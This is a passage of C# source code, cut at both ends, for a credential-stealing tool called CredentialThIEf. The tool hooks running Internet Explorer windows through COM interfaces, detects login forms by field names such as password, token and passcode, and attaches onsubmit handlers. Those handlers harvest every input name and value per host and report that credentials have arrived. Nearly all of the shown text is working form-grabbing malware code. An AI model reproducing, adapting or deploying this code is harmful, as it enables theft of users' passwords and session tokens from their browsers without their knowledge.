            [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
            internal static extern bool IsWow64Process(IntPtr process, out bool wow64Process);
        }
    }            
    [Guid("6D5140C1-7436-11CE-8034-00AA006009FA")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [ComImport]
    public interface IServiceProvider
    {
        int QueryService( ref Guid guidService, ref Guid riid,  out IntPtr ppvObject);
    }

    [ComImport]
    [Guid("00000114-0000-0000-C000-000000000046")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]

    public interface IOleWindow
    {
        void GetWindow(out IntPtr phwnd);
        void ContextSensitiveHelp([In, MarshalAs(UnmanagedType.Bool)] bool fEnterMode);
    }

    public class WindowFinder
    {
        static Guid iaccessbile = new System.Guid("618736E0-3C3D-11CF-810C-00AA00389B71");
        static Guid iserviceProvider = new System.Guid("6D5140C1-7436-11CE-8034-00AA006009FA");
        static Guid ihtmlwindow2 = new  System.Guid("332C4427-26CB-11D0-B483-00C04FD90119");
        static Guid iwebbrowsapp = new System.Guid("0002DF05-0000-0000-C000-000000000046");
        static Guid iwebbrowser2 = new System.Guid("D30C1661-CDAF-11D0-8A3E-00C04FC9E26E");
        public static Dictionary<IntPtr, Dictionary<String, object>> FindWebBrowserFromHwnd(IntPtr hwnd)
        {
            var results = new Dictionary<IntPtr, Dictionary<String, object>>();
            WindowFinder.EnumChildWindows(hwnd, (lt, p) =>
            {
                var sb = new System.Text.StringBuilder(250);
                WindowFinder.GetClassName(lt, sb, 250);
                if (sb.ToString() == "Internet Explorer_Server")
                {
                    var pIAcc = System.IntPtr.Zero;
                    if (0 == WindowFinder.AccessibleObjectFromWindow(lt, (uint)WindowFinder.OBJID.WINDOW, ref iaccessbile, ref pIAcc))
                    {
                        try
                        {
                            var pIServ = IntPtr.Zero;
                            System.Runtime.InteropServices.Marshal.QueryInterface(pIAcc, ref iserviceProvider, out pIServ);
                            var isp = System.Runtime.InteropServices.Marshal.GetObjectForIUnknown(pIServ) as IServiceProvider;
                            if (null != isp)
                            {
                                var pHtmlWin2 = System.IntPtr.Zero;
                                isp.QueryService(ref ihtmlwindow2, ref ihtmlwindow2, out pHtmlWin2);
                                var phtml = System.Runtime.InteropServices.Marshal.GetObjectForIUnknown(pHtmlWin2) as mshtml.IHTMLWindow2;
                                var isp2 = System.Runtime.InteropServices.Marshal.GetObjectForIUnknown(pHtmlWin2) as IServiceProvider;
                            
                                var pwbBrowser2 = System.IntPtr.Zero;
                                isp2.QueryService(ref iwebbrowsapp, ref iwebbrowser2, out pwbBrowser2);
                                var iwb2 = System.Runtime.InteropServices.Marshal.GetObjectForIUnknown(pwbBrowser2);

                                results.Add(lt, new Dictionary<string,object>(){{"iwb2", iwb2}});
                                results[lt].Add("ihtmlwin2",phtml);
                                //System.Runtime.InteropServices.Marshal.Release(pHtmlWin2);
                                //System.Runtime.InteropServices.Marshal.Release(pIServ);
                            }
                        }
                        catch {}
                    }
                }
                return true;
            }, IntPtr.Zero);
            return results;
        }
        internal enum OBJID : uint
        {
            WINDOW = 0x00000000,
            SYSMENU = 0xFFFFFFFF,
            TITLEBAR = 0xFFFFFFFE,
            MENU = 0xFFFFFFFD,
            CLIENT = 0xFFFFFFFC,
            VSCROLL = 0xFFFFFFFB,
            HSCROLL = 0xFFFFFFFA,
            SIZEGRIP = 0xFFFFFFF9,
            CARET = 0xFFFFFFF8,
            CURSOR = 0xFFFFFFF7,
            ALERT = 0xFFFFFFF6,
            SOUND = 0xFFFFFFF5,
        }
        public delegate bool EnumChildDelegate(IntPtr hWnd, IntPtr lParam);
        public delegate bool EnumWindowsDelegate(IntPtr hWnd, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern bool EnumChildWindows(IntPtr hwndparent, EnumChildDelegate lpfn, IntPtr lParam);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindowEx(IntPtr hwnd, IntPtr hwndChildAfter, string lpClassName, string lpWindowName);
        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
        public static extern IntPtr FindWindowByCaption(IntPtr ZeroOnly, string lpWindowName);
        public delegate bool EnumThreadDelegate(IntPtr hWnd, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern bool EnumThreadWindows(uint dwThreadId, EnumThreadDelegate lpfn, IntPtr lParam);
        [DllImport("user32.dll")]
        public static extern IntPtr GetWindow(IntPtr hwnd, uint uCmd);
        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetParent(IntPtr hWnd);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetAncestor(IntPtr hWnd, uint ucmd);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool EnumWindows(EnumWindowsDelegate lpEnumFunc, IntPtr lParam);
        [DllImport("oleacc.dll")]
        public static extern int AccessibleObjectFromWindow( IntPtr hwnd, uint id, ref Guid iid, ref IntPtr ppvObject);
    }


    public static class WindowHelper
    {
        [DllImport("user32")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32")]
        public static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

        [DllImport("user32")]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint GetCurrentThreadId();

        [DllImport("user32.dll")]
        static extern IntPtr GetFocus();

        [DllImport("user32.dll")]
        static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

        public static IntPtr GetFocusedControl()
        {
            uint id = 0;
            IntPtr hFore = GetForegroundWindow();
            AttachThreadInput(GetWindowThreadProcessId(hFore, out id), GetCurrentThreadId(), true);
            IntPtr hFocus = GetFocus();
            AttachThreadInput(GetWindowThreadProcessId(hFore, out id), GetCurrentThreadId(), false);
            return hFocus;
        }

        public static IntPtr GetHWNDFromDocument(HTMLDocumentClass pdocument)
        {
            IntPtr hwnd = IntPtr.Zero;
            IOleWindow wind = pdocument as IOleWindow;
            if (null != wind)
                wind.GetWindow(out hwnd);
            return hwnd;
        }
    }

    public class CredentialThIEf
    {
        IShellWindows _shwin;
        String blankURLFilter = "^(?!.*about:blank).*$";
        static CredentialThIEf _singleton;
        object _locker = new object();
        
        public CredentialThIEf(object shw) : this()
        {
            _shwin = shw as IShellWindows;
        }

        public CredentialThIEf()
        {
            if (null == _singleton)
            {
                lock (_locker)
                {
                    if (null == _singleton)
                    {
                        _singleton = this;
                    }
                }
            }
        }
            
        public void AddManualHook(object wbrowser2, IntPtr index)
        {
            IWebBrowser2 wb2 = wbrowser2 as IWebBrowser2;
            
            var nguid = System.Guid.NewGuid();
            var lgf = new LoginFormHooker(wb2, nguid.ToString());
            TrackingCollections.gLoginFormHooker.Add(index, lgf);
            TrackingCollections.gKnownHwnds.Add(index);
            TrackingCollections.gMapHwndsToId.Add(index, Guid.NewGuid());
            Console.WriteLine("[+] Hooking DocumentComplete event for " + index.ToString());
        }
        
        public static void QueueUpdate(int state)
        {
            var t = new Thread(delegate()
            {
                _singleton.Update(state);
            });
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
        }

        public void Update(int state)
        {
            Thread.Sleep(2000);
            var newhooks = false;
            var lstCurrHwnds = new List<IntPtr>();
            lock(_locker)
            {
                try 
                {
                    var focusHwnd = WindowHelper.GetFocusedControl();
                    Console.WriteLine("[+] HWND now in focus is " + focusHwnd.ToString());
                    
                    foreach (IWebBrowser2 shell in _shwin)
                    {
                        var fileName = System.IO.Path.GetFileNameWithoutExtension(shell.FullName).ToLower();
                        if (fileName.Equals("iexplore"))
                        {
                            if (Regex.Match(((mshtml.IHTMLDocument2)shell.Document).url, blankURLFilter).Success)
                            {
                                var hwnd = WindowHelper.GetHWNDFromDocument((mshtml.HTMLDocumentClass)shell.Document);
                                lstCurrHwnds.Add(hwnd);
                                if (!TrackingCollections.gKnownHwnds.Contains(hwnd))
                                {
                                    Console.WriteLine("[+] Not currently tracking HWND " + hwnd.ToString() + " must be new");
                                    if (hwnd != IntPtr.Zero)
                                    {
                                        Guid track = Guid.NewGuid();
                                        TrackingCollections.gLoginFormHooker.Add(hwnd, new LoginFormHooker(shell, track.ToString()));
                                        TrackingCollections.gKnownHwnds.Add(hwnd);
                                        TrackingCollections.gMapHwndsToId.Add(hwnd, track);

                                        Console.WriteLine("[+] Registered HWND " + focusHwnd.ToString() + ":" + track.ToString() + " hooking DocumentComplete event");
                                        newhooks = true;
                                    }
                                }
                            }
                        }
                    }
                }
                catch(Exception ex)
                {
                    Console.WriteLine("[X] Exception thrown trying to register new window. Tracking collections may be unbalanced (consider restarting) " + ex.Message );
                }
                var i = 0;
                var tmp = new List<IntPtr>();
                tmp.AddRange(TrackingCollections.gKnownHwnds);
                foreach(var n in tmp)
                {
                    if (!lstCurrHwnds.Contains(n))
                    {
                        try
                        {
                            LoginFormHooker.Detach(TrackingCollections.gMapHwndsToId[n].ToString());
                            TrackingCollections.gLoginFormHooker.Remove(n);
                            TrackingCollections.gKnownHwnds.Remove(n);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[X] Exception thrown trying to cleanup zombie windows. Tracking collections may be unbalanced (consider restarting) " + ex.Message);
                        }
                        i++;
                        Console.WriteLine("[+] HWND " + n.ToString() + " no longer active so tracking removed");
                    }
                }

                if (!(newhooks) && i == 0)
                {
                    Console.WriteLine("[+] No new windows to hook");
                }
                else {
                     Console.WriteLine("[+] Removed tracking on " + i.ToString() + " zombie windows");
                }
            }
        }
    }

    public static class TrackingCollections
    {
        static Dictionary<IntPtr, Object> _loginFormHookerArr = new Dictionary<System.IntPtr, object>();
        static List<IntPtr> _hwnds = new List<IntPtr>();
        static Dictionary<IntPtr, Guid> _mapHwndsToId = new Dictionary<IntPtr, Guid>();

        public static Dictionary<IntPtr, Object> gLoginFormHooker { get { return _loginFormHookerArr; } }
        public static List<IntPtr> gKnownHwnds { get { return _hwnds; } }
        public static Dictionary<IntPtr, Guid> gMapHwndsToId { get { return _mapHwndsToId; } }
    }
    
    public static class DOMQuery
    {
        public static List<String> getElementsByTagName(object iwebbrowser2, string selector)
        {
            var results = new List<String>();
            var ie = iwebbrowser2 as IWebBrowser;
            if (null != ie)
            {
                var doc  = ie.Document as mshtml.IHTMLDocument3;
                if(null != doc)
                {
                    var coll = doc.getElementsByTagName(selector);
                    foreach (mshtml.IHTMLElement n in coll)
                    {
                        results.Add(n.outerHTML);
                    }
                }
            }
            return results;
        }

        public static List<String> getElementsByName(object iwebbrowser2, string selector)
        {
            var results = new List<String>();
            var ie = iwebbrowser2 as IWebBrowser;
            if (null != ie)
            {
                var doc  = ie.Document as mshtml.IHTMLDocument3;
                if(null != doc)
                {
                    var coll = doc.getElementsByName(selector);
                    foreach (mshtml.IHTMLElement n in coll)
                    {
                        results.Add(n.outerHTML);
                    }
                }
            }
            return results;
        }
    }


    public delegate void DCALLBACK(object state);
    public delegate void DCREDADDEDCALLBACK(String host, List<String> creds);
    public delegate void DDISPATCHHANDLER(object state, object[] handler );
    public class HTMLEventProxy
    {
    }
    public class HtmlEventProxy : BaseEventProxy
    {
        DCALLBACK _callback;
        public DCALLBACK callback { get { return _callback; } set { _callback = value; } }
        static Dictionary<String, HtmlEventProxy> mapSrcIdToEvent;
        object _locker = new object();
        IReflect typeIReflectImplementation;
        IHTMLElement2 htmlElement = null;
        string eventName = null;
        string EventIdentifier = null;

        static HtmlEventProxy()
        {
            mapSrcIdToEvent = new Dictionary<String, HtmlEventProxy>();
        }

        public static bool CheckIfHandled(string eventName, IHTMLElement2 htmlElement)
        {
            foreach (HtmlEventProxy h in mapSrcIdToEvent.Values)
            {
                if (h.htmlElement == htmlElement && h.eventName == eventName)
                    return true;
            }
            return false;
        }

        HtmlEventProxy(string eventName, IHTMLElement2 htmlElement, String EventIdentifier, DCALLBACK callback)
        {
            this.callback = callback;
            this.eventName = eventName;
            this.htmlElement = htmlElement;
            Type type = typeof(HtmlEventProxy);
            this.typeIReflectImplementation = type;
        }

        public static HtmlEventProxy Create(string eventName, IHTMLElement2 htmlElement, String EventIdentifier, DCALLBACK callback)
        {
            if (mapSrcIdToEvent.ContainsKey(EventIdentifier))
            {
                return mapSrcIdToEvent[EventIdentifier];
            }
            else
            {
                IHTMLElement2 elem = htmlElement;
                HtmlEventProxy newProxy = new HtmlEventProxy(eventName, elem, EventIdentifier, callback);
                elem.attachEvent(eventName, newProxy);
                mapSrcIdToEvent.Add(EventIdentifier, newProxy);
                return newProxy;
            }
        }

        public static void Detach(String EventIdentifier)
        {
            if (mapSrcIdToEvent.ContainsKey(EventIdentifier))
            {
                mapSrcIdToEvent[EventIdentifier].Detach();
            }
        }

        public void Detach()
        {
            lock (this)
            {
                if (this.htmlElement != null)
                {
                    IHTMLElement2 elem = htmlElement;
                    elem.detachEvent(this.eventName, this);
                    this.htmlElement = null;
                }
                mapSrcIdToEvent.Remove(EventIdentifier);
            }
        }

        public IHTMLElement2 HTMLElement
        {
            get
            {
                return this.htmlElement;
            }
        }

        public override object InvokeMember(string name, BindingFlags invokeAttr, Binder binder, object target, object[] args, ParameterModifier[] modifiers, CultureInfo culture, string[] namedParameters)
        {
            if (name == "[DISPID=0]")
            {
                if (this.callback != null)
                    this.callback.Invoke(target);
            }

            return null;
        }

        public override void Dispose()
        {
            Detach();
        }
    }

    public class DipatchEventProxy : BaseEventProxy
    {
        object _locker = new object();
        Dictionary<int, DDISPATCHHANDLER> mapDispIdToHandler = new Dictionary<int, DDISPATCHHANDLER>();
        IConnectionPointContainer _connPointContainer;
        IConnectionPoint _iconnpoint = null;
        int _cookie;
        public DipatchEventProxy(object connPointContainer, Guid EventInterfaceID)
        {
            if (null == (connPointContainer as IConnectionPointContainer))
                throw new Exception("Object passed can not cast to IConnectionPointContainer");
            _connPointContainer = connPointContainer as IConnectionPointContainer;
            _connPointContainer.FindConnectionPoint(ref EventInterfaceID, out _iconnpoint);
            if (null == _iconnpoint)
                throw new Exception(String.Format("IConnectionPoint is null for GUID {0}", EventInterfaceID));

            _iconnpoint.Advise(this, out _cookie);
        }

        public void AddDispatchHandler(int dispid, DDISPATCHHANDLER eventHandler)
        {
            lock (_locker)
            {
                if (!mapDispIdToHandler.ContainsKey(dispid))
                    mapDispIdToHandler.Add(dispid, eventHandler);
                else
                    mapDispIdToHandler[dispid] = eventHandler;
            }
        }

        public void DetachAll()
        {
            lock (_locker)
            {
                _iconnpoint.Unadvise(_cookie);
                mapDispIdToHandler.Clear();
            }
        }

        public void Detach(int dispid)
        {
            lock (_locker)
            {
                if (mapDispIdToHandler.ContainsKey(dispid))
                    mapDispIdToHandler.Remove(dispid);
            }
        }

        public override object InvokeMember(string name, BindingFlags invokeAttr, Binder binder, object target, object[] args, ParameterModifier[] modifiers, CultureInfo culture, string[] namedParameters)
        {
            Int32 dispid = -1;
            if (Int32.TryParse(new Regex(@"(?<=\[DISPID=)\d*?(?=\])").Match(name).Value, out dispid))
            {
                lock (_locker)
                {
                    if (mapDispIdToHandler.ContainsKey(dispid))
                        mapDispIdToHandler[dispid].Invoke(target, args);
                }
            }
            return null;
        }

        public override void Dispose()
        {
            base.Dispose();
            DetachAll();
        }
    }

    [Guid("B196B284-BAB4-101A-B69C-00AA00341D07")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [ComImport]
    public interface IConnectionPointContainer
    {
        void EnumConnectionPoints(out IEnumConnectionPoints ppEnum);
        void FindConnectionPoint([In] ref Guid riid, out IConnectionPoint ppCP);
    }

    [ComImport, Guid("85CB6900-4D95-11CF-960C-0080C7F4EE85"), DefaultMember("Item")]
    public interface IShellWindows : System.Collections.IEnumerable
    {

    }

    [Guid("B196B287-BAB4-101A-B69C-00AA00341D07")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]

    [ComImport]
    public interface IEnumConnections
    {
        [MethodImpl(MethodImplOptions.PreserveSig)]
        int Next(int celt, [MarshalAs(UnmanagedType.LPArray), Out] System.Runtime.InteropServices.ComTypes.CONNECTDATA[] rgelt, IntPtr pceltFetched);
        [MethodImpl(MethodImplOptions.PreserveSig)]
        int Skip(int celt);
        void Reset();
        void Clone(out IEnumConnections ppenum);
    }

    [Guid("B196B285-BAB4-101A-B69C-00AA00341D07")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [ComImport]
    public interface IEnumConnectionPoints
    {
        [MethodImpl(MethodImplOptions.PreserveSig)]
        int Next(int celt, [MarshalAs(UnmanagedType.LPArray), Out] IConnectionPoint[] rgelt, IntPtr pceltFetched);
        [MethodImpl(MethodImplOptions.PreserveSig)]
        int Skip(int celt);
        void Reset();
        void Clone(out IEnumConnectionPoints ppenum);
    }

    [Guid("B196B286-BAB4-101A-B69C-00AA00341D07")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [ComImport]
    public interface IConnectionPoint
    {
        void GetConnectionInterface(out Guid pIID);
        void GetConnectionPointContainer(out IConnectionPointContainer ppCPC);
        void Advise([MarshalAs(UnmanagedType.Interface)] object pUnkSink, out int pdwCookie);
        void Unadvise(int dwCookie);
        void EnumConnections(out IEnumConnections ppEnum);
    }


    public abstract class BaseEventProxy : IDisposable, IReflect
    {
        IReflect typeIReflectImplementation { get { return this.GetType(); } }
        public BaseEventProxy()
        {
        }

        FieldInfo IReflect.GetField(string name, BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetField(name, bindingAttr);
        }

        FieldInfo[] IReflect.GetFields(BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetFields(bindingAttr);
        }

        MemberInfo[] IReflect.GetMember(string name, BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetMember(name, bindingAttr);
        }

        MemberInfo[] IReflect.GetMembers(BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetMembers(bindingAttr);
        }

        MethodInfo IReflect.GetMethod(string name, BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetMethod(name, bindingAttr);
        }

        MethodInfo IReflect.GetMethod(string name, BindingFlags bindingAttr, Binder binder, Type[] types, ParameterModifier[] modifiers)
        {
            return this.typeIReflectImplementation.GetMethod(name, bindingAttr, binder, types, modifiers);
        }

        MethodInfo[] IReflect.GetMethods(BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetMethods(bindingAttr);
        }

        PropertyInfo[] IReflect.GetProperties(BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetProperties(bindingAttr);
        }

        PropertyInfo IReflect.GetProperty(string name, BindingFlags bindingAttr)
        {
            return this.typeIReflectImplementation.GetProperty(name, bindingAttr);
        }

        PropertyInfo IReflect.GetProperty(string name, BindingFlags bindingAttr, Binder binder, Type returnType, Type[] types, ParameterModifier[] modifiers)
        {
            return this.typeIReflectImplementation.GetProperty(name, bindingAttr, binder, returnType, types, modifiers);
        }

        public virtual object InvokeMember(string name, BindingFlags invokeAttr, Binder binder, object target, object[] args, ParameterModifier[] modifiers, CultureInfo culture, string[] namedParameters)
        {
            return null;
        }

        Type IReflect.UnderlyingSystemType
        {
            get
            {
                return this.typeIReflectImplementation.UnderlyingSystemType;
            }
        }

        public virtual void Dispose()
        {
        }

    }
    public class LoginFormDetector
    {
        static List<String> inputLoginNames = new List<String>();
        static LoginFormDetector()
        {
            inputLoginNames.AddRange(new String[] { "login", "username", "password", "email", "address", "sudo", "passwd", "loginfmt", "pass", "uid", "userid", "token", "passcode", "code" });
        }

        static bool CheckPossibleLoginForm(mshtml.HTMLFormElement form)
        {
            object autocomplete = form.getAttribute("autocomplete",0);
            if (autocomplete.ToString() == "off")
                return true;
            object action = form.action;
            if (action.ToString().ToLower().Contains("login"))
                return true;

            return false;
        }

        static bool CheckForPasswordField(HTMLFormElement form)
        {
            foreach (IHTMLElement input in form.getElementsByTagName("password"))
                return true;
            return false;
        }

        public static bool CheckPossibleLoginInput(HTMLFormElement form)
        {
            bool foundLoginForm = CheckForPasswordField(form) && CheckPossibleLoginForm(form);
            if (!foundLoginForm)
            {
                foreach (mshtml.IHTMLElement input in form.getElementsByTagName("input"))
                {
                    if (null != input)
                    {
                        var attrname = input.getAttribute("name",0);
                        if (null != attrname && attrname is String)
                        {
                            var inputName = ((String)attrname).ToLower();
                            if (!String.IsNullOrEmpty(inputName.Trim()) && !foundLoginForm)
                            {
                                foreach (String a in inputLoginNames)
                                {
                                    if (inputName.ToString().Contains(a.ToString()) && !foundLoginForm)
                                    {
                                        foundLoginForm = true;
                                        break;
                                    }
                                }
                            }
                        }    
                    }                   
                }
            }
            return foundLoginForm;
        }
    }

    public class LoginFormHooker
    {
        IWebBrowser2 _ie;
        static DCREDADDEDCALLBACK CredAddedCallback;
        static Dictionary<String, List<String>> _credsFound = new Dictionary<string, List<String>>();
        static Dictionary<String, LoginFormHooker> _mapIdToFormHooker = new Dictionary<string, LoginFormHooker>();
        bool hooked = false;
        HtmlEventProxy formHook;
        public LoginFormHooker(object ie, String id)
        {
            _mapIdToFormHooker.Add(id, this);
            _ie = ie as IWebBrowser2;

            //Yeah this is not ideal load of HardCoded stuff but it's COM and Globally Unique 
            //So shouldn't change.....

            Guid IID_DWebBrowserEvents2 = new Guid("34a715a0-6587-11d0-924a-0020afc7ac4d");
            DipatchEventProxy handler = new DipatchEventProxy(ie, IID_DWebBrowserEvents2);
            //DispatchId of 259 relates to the event DocumentComplete on DWebBrowserEvents2
            handler.AddDispatchHandler(259, delegate (object o, object[] a) { FindAndHookLoginForm();});
            FindAndHookLoginForm();
        }

        void FindAndHookLoginForm()
        {
            try
            {
                HTMLDocument doc = (HTMLDocument)_ie.Document;
                IHTMLElementCollection elems = doc.getElementsByTagName("form");
                foreach (HTMLFormElement logForm in elems)
                {
                    if (LoginFormDetector.CheckPossibleLoginInput(logForm))
                    {
                        IHTMLElement2 elem = logForm as IHTMLElement2;
                        HookForm(elem);
                    }
                }
            }
            catch
            {
            }
        }

        public static Dictionary<String, List<String>> GetCreds()
        {
            return _credsFound;
        }

        public static void Detach(String id)
        {
            if (_mapIdToFormHooker.ContainsKey(id))
                _mapIdToFormHooker[id].Detach();
        }

        void Detach()
        {
            if (null != formHook)
                formHook.Detach();
        }

        bool HookForm(IHTMLElement2 logForm)
        {
            Guid g = Guid.NewGuid();
            if (!hooked)
            {
                lock (this)
                {
                    if (hooked)
                        return false;
                    formHook = HtmlEventProxy.Create("onsubmit", logForm, g.ToString(), delegate ( object o) {
                        HtmlEventProxy prox = o as HtmlEventProxy;
                        if (null != prox)
                        {
                            IHTMLElement targetForm = prox.HTMLElement as IHTMLElement;
                            if (null != targetForm)
                            {
                                HTMLDocument formDoc = targetForm.document as HTMLDocument;
                                if (null != formDoc)
                                {
                                    String host = new Uri(formDoc.url).Host;
                                    if (!_credsFound.ContainsKey(host))
                                        _credsFound.Add(host, new List<String>());


                                    bool bFound = false;
                                    foreach (mshtml.IHTMLElement input in formDoc.getElementsByTagName("input"))
                                    {
                                        object value = input.getAttribute("value", 0);
                                        if (!String.IsNullOrEmpty(value.ToString().Trim()))
                                        {
                                            object cred = input.getAttribute("name", 0) + " : " + value;
                                            if (!_credsFound[host].Contains(cred.ToString().Trim()))
                                            {
                                                _credsFound[host].Add(cred.ToString().Trim());
                                                if (!bFound)
                                                    Console.WriteLine(String.Format("[+] Creds have arrived in from {0}", host));
                                                bFound = true;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    });
                }
                return true;
            }
            return false;
        }
    }
    [ComImport, Guid("D30C1661-CDAF-11D0-8A3E-00C04FC9E26E"), TypeLibType((short)0x1050), DefaultMember("Name"), SuppressUnmanagedCodeSecurity]
    public interface IWebBrowser2 : IWebBrowserApp
    {
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(100)]
        void GoBack();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x65)]
        void GoForward();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x66)]
        void GoHome();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x67)]
        void GoSearch();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x68)]
        void Navigate([In, MarshalAs(UnmanagedType.BStr)] string URL, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object Flags, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object TargetFrameName, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object PostData, [In, Optional, MarshalAs(UnmanagedType.Struct)] ref object Headers);
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(-550)]
        void Refresh();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x69)]
        void Refresh2([In, Optional, MarshalAs(UnmanagedType.Struct)] ref object Level);
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x6a)]
        void Stop();
        [DispId(200)]
        object Application { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(200)] get; }
        [DispId(0xc9)]
        object Parent { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xc9)] get; }
        [DispId(0xca)]
        object Container { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xca)] get; }
        [DispId(0xcb)]
        object Document { [return: MarshalAs(UnmanagedType.IDispatch)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcb)] get; }
        [DispId(0xcc)]
        bool TopLevelContainer { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcc)] get; }
        [DispId(0xcd)]
        string Type { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcd)] get; }
        [DispId(0xce)]
        int Left { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xce)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xce)] set; }
        [DispId(0xcf)]
        int Top { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcf)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xcf)] set; }
        [DispId(0xd0)]
        int Width { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd0)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd0)] set; }
        [DispId(0xd1)]
        int Height { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd1)] get; [param: In] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd1)] set; }
        [DispId(210)]
        string LocationName { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(210)] get; }
        [DispId(0xd3)]
        string LocationURL { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd3)] get; }
        [DispId(0xd4)]
        bool Busy { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0xd4)] get; }
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(300)]
        void Quit();
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x12d)]
        void ClientToWindow([In, Out] ref int pcx, [In, Out] ref int pcy);
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x12e)]
        void PutProperty([In, MarshalAs(UnmanagedType.BStr)] string Property, [In, MarshalAs(UnmanagedType.Struct)] object vtValue);
        [return: MarshalAs(UnmanagedType.Struct)]
        [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x12f)]
        object GetProperty([In, MarshalAs(UnmanagedType.BStr)] string Property);
        [DispId(0)]
        string Name { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0)] get; }
        [DispId(-515)]
        int HWND { [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(-515)] get; }
        [DispId(400)]
        string FullName { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(400)] get; }
        [DispId(0x191)]
        string Path { [return: MarshalAs(UnmanagedType.BStr)] [MethodImpl(MethodImplOptions.InternalCall, MethodCodeType = MethodCodeType.Runtime), DispId(0x191)] get; }
        [DispId(0x192)]
